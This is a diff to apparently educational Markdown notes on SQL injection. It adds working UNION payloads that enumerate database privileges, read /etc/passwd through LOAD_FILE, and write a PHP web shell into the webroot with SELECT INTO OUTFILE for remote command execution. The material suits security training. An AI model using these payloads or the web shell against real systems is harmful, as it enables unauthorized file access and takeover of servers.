@@ -26,8 +26,15 @@
       - [TABLES](#tables)
       - [COLUMNS](#columns)
       - [Data](#data)
-    - [Reading Files](#reading-files)
-    - [Writing Files](#writing-files)
+    - [Reading \& Writing Files](#reading--writing-files)
+      - [DB User](#db-user)
+      - [User Privileges](#user-privileges)
+      - [LOAD\_FILE](#load_file)
+      - [Write File Privileges](#write-file-privileges)
+        - [secure\_file\_priv](#secure_file_priv)
+      - [SELECT INTO OUTFILE](#select-into-outfile)
+      - [Writing Files through SQLi](#writing-files-through-sqli)
+      - [Writing a Web Shell](#writing-a-web-shell)
   - [SQLi Mitigation](#sqli-mitigation)
 
 ---
@@ -473,8 +480,156 @@ cn' UNION select 1, username, password, 4 from dev.credentials--
 
 ![Creds](../../../images/sqli14.png)
 
-### Reading Files
+### Reading & Writing Files
 
-### Writing Files
+In addition to gathering data from various tables and databases within the DBMS, a SQLi can also be lveraged to perform many other operations, such as reading and writing files on the server and even gaining remote code execution on the back-end server.
+
+> [!NOTE]
+> Reading data is much more common than writing data, which is strictly reserved for privileged users in modern DBMSes, as it can lead to system exploitation.
+
+#### DB User
+
+First, you have to determine which user you are within the database. While you do not necessarily need database administrator (DBA) privileges to read data, this is becoming more required in modern DBMSes, as only DBA are given such privileges. The same applies to other common databases. If you do have DBA privileges, then it is much more probable that you have file-read privileges. If you don't, then you have to check your privileges to see what you can do. To find your current DB user:
+
+```sql
+SELECT USER()
+SELECT CURRENT_USER()
+SELECT user from mysql.user
+```
+
+So the payload will be:
+
+```sql
+cn' UNION SELECT 1, user(), 3, 4-- 
+```
+
+![User](../../../images/sqli15.png)
+
+#### User Privileges
+
+You can now start looking for what privileges you have with that user. First of all, you can test if you have super admin priviliges with the following query:
+
+```sql
+SELECT super_priv FROM mysql.user
+```
+
+So the payload will be:
+
+```sql
+cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- 
+```
+
+> [!TIP]
+> If you had many users within the DBMS, you can add ```WHERE user="root"``` to only show privileges for your current user root.
+
+A possible result can look like this:
+
+![YES](../../../images/sqli16.png)
+
+The query returned ```Y```, which means YES, indicating superuser privileges. You can also dump other privileges you have from the schema:
+
+```sql
+cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- 
+```
+
+Again, being more precise:
+
+```sql
+cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- 
+```
+
+![privilege_type](../../../images/sqli17.png)
+
+You can see that the ```FILE``` privilegeis listed for your user, enabling you to read files and potentially even write files.
+
+#### LOAD_FILE
+
+The ```LOAD_FILE()``` function can be used in MariaDB / MySQL to read data from files. The function takes in just one argument, which is the file name.
+
+```sql
+cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- 
+```
+
+![/etc/passwd](../../../images/sqli18.png)
+
+#### Write File Privileges
+
+To be able to write files to the back-end server using a MySQL database, you require:
+
+1. User with ```FILE``` privilege enabled
+2. MySQL gloabl ```secure_file_priv``` variable not enabled
+3. Write access to the location you want to write to on the back-end server
+
+##### secure_file_priv
+
+... is a variable used to determine where to read/write files from. An empty value lets you read files from the entire file system. Otherwise, if a certain directory is set, you can only read from the folder specified by the variable. On the other hand, ```NULL``` means you cannot read/write from any directory. MariaDB has this variable set to empty by default, which lets you read/write to any file if the user has the ```FILE``` privilege. However, MySQL uses ```/var/lib/mysql-files``` as the default folder. This means reading files through a MySQL injection isn't possible with default settings. Even worse, some modern configurations default to ```NULL```, meaning that you cannot read/write files anywhere within the system.
+
+```sql
+SHOW VARIABLES LIKE 'secure_file_priv';
+```
+
+All variables and most configurations are stored within the INFORMATION_SCHEMA database. MySQL global variables are stored in a table called ```global_variables```, and as per the documentation, this table has two columns ```variable_name``` and ```variable_value```.
+
+You have to select these two columns frm that table in the INFORMATION_SCHEMA database. There are hundreds of global variables in a MySQL configuration, and you don't want to retrieve all of them. You can filter the results to only show the ```secure_file_priv``` variable, using the WHERE clause.
+
+```sql
+SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"
+```
+
+So the payload will be:
+
+```sql
+cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- 
+```
+
+![SECURE_FILE_PRIV](../../../images/sqli19.png)
+
+```secure_file_priv``` is empty, meaning you can read/write files to any location.
+
+#### SELECT INTO OUTFILE
+
+... can be used to write data from select queries into files. This is usually used for exporting data from tables.
+
+Usage example:
+
+```sql
+SELECT * from users INTO OUTFILE '/tmp/credentials';
+```
+
+It is also possible to directly SELECT strings into files, allowing you to write arbitrary files to the back-end server.
+
+```sql
+SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';
+```
+
+> [!TIP]
+> Advanced file exports utilize the 'FROM_BASE64("base64_data")' function in order to be able to write long/advanced files, including binary data.
+
+#### Writing Files through SQLi
+
+First you write a text file to the webroot and verify if you have write permissions.
+
+```sql
+cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- 
+```
+
+> [!NOTE]
+> To write a web shell, you must know the base web directory for the web server. One way to find it is to use ```load_file``` to read the server config, like Apache's config found at ```/etc/apache2/apache2.conf```, Nginx's config at ```/etc/nginx/nginx.conf```, IIS config at ```%WinDir%System32\Inetsrv\Config\ApplicationHost.config```. You can also try wordlists to fuzz: [Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) and [Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt)
+
+If there are no errors, that indicates that the query was succeeded. But can check too:
+
+![success](../../../images/sqli20.png)
+
+#### Writing a Web Shell
+
+Having confirmed write permissions, you can go ahead and write a PHP web shell to the webroot folder.
+
+```sql
+cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- 
+```
+
+If there are no errors, you can now browse to ```/shell.php``` and execute commands via the parameter ```0```, with ```?0=id``` in your URL.
+
+![web shell](../../../images/sqli21.png)
 
 ## SQLi Mitigation
